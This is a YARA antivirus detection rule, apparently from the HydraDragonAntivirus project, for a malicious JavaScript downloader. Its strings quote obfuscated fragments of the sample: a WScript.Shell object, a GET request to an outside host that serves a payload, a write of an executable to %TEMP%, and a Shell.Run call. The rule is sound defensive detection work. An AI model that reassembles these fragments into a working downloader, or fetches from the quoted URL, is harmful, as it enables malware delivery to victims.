rule sig_20160328_d3e734027fb1f751cc5d6bdb1751156f {
  meta:
    description = "datamaliciousorder - file 20160328_d3e734027fb1f751cc5d6bdb1751156f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "414f5643c7a9978d105ee26e8e59005a7f75a10b11140c59f0f179645306b114"

  strings:
    $s1  = "function Gbfclafw() {return Jzaqhao[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Nyisg2WvvG.exe\";};" fullword ascii
    $s2  = "do {WScript[Xswdz](Gzwlyiqv() * 11)} while (Dqydbx[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Dqydbx[Nyytimejzd](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s4  = "function Sflugs(Muxqj, Dhjep){return Muxqj - Dhjep;};" fullword ascii
    $s5  = "var Jzaqhao = function Dycgjso() {return WScript[Ofpxdm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bsiiwfktxq() {return ((Svytmyqai == true) && (Svytmyqai == Vfvido)) ? 1 : Leiqafteyb;};" fullword ascii
    $s7  = "function Xprsibhhe(Qjetgmszdh){Jzaqhao[\"Run\"](Qjetgmszdh, Leiqafteyb, Leiqafteyb);};" fullword ascii
    $s8  = "var Svytmyqai = false;" fullword ascii
    $s9  = "var Vfvido = false;" fullword ascii
    $s10 = " while (Idtvim){" fullword ascii
    $s11 = "return Sflugs(Qvyvzvpbpl, Utmckgo);" fullword ascii
    $s12 = "Vfvido = true; " fullword ascii
    $s13 = "function Izlkyt()" fullword ascii
    $s14 = "function Didajunb(Zmexeaurd) {var Xmcvob = (1, 2, 3, 4, 5, Zmexeaurd); return Xmcvob;};" fullword ascii
    $s15 = "function Gzwlyiqv(){return 22;};" fullword ascii
    $s16 = "function Fzxpxvvnm(){return Zgxbdta;};" fullword ascii
    $s17 = "var Dhhfufg = false;" fullword ascii
    $s18 = "function Gxzjmiw(){return Ofpxdm;};" fullword ascii
    $s19 = "var Ajwaqid = new this[\"Date\"]();" fullword ascii
    $s20 = "Svytmyqai = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}